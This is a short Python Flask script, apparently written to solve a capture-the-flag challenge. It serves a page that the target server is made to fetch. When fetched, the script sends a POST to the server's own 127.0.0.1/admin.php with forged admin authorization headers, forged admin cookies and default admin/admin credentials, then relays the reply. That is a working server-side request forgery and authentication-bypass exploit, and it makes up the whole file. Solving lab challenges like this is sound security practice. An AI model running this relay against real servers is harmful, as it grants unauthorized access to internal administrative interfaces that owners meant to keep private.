from flask import Flask, request, Response
import requests

app = Flask(__name__)

@app.route("/")
def forward_to_internal_admin():
    # Forwarding request FROM the CTF server to 127.0.0.1/admin.php
    internal_url = "http://127.0.0.1/admin.php"

    headers = {
        "Authorization": "ADMIN"
    }

    cookies = {
        "Permission": "ADMINISTRATOR"
    }

    data = {
        "Id": "admin",
        "Password": "admin"
    }

    try:
        # The CTF server fetches THIS page
        # Which itself makes a POST to its own 127.0.0.1
        r = requests.post(internal_url, headers=headers, cookies=cookies, data=data)
        return Response(r.text, status=r.status_code)
    except Exception as e:
        return str(e), 500

app.run(host="0.0.0.0", port=8000)
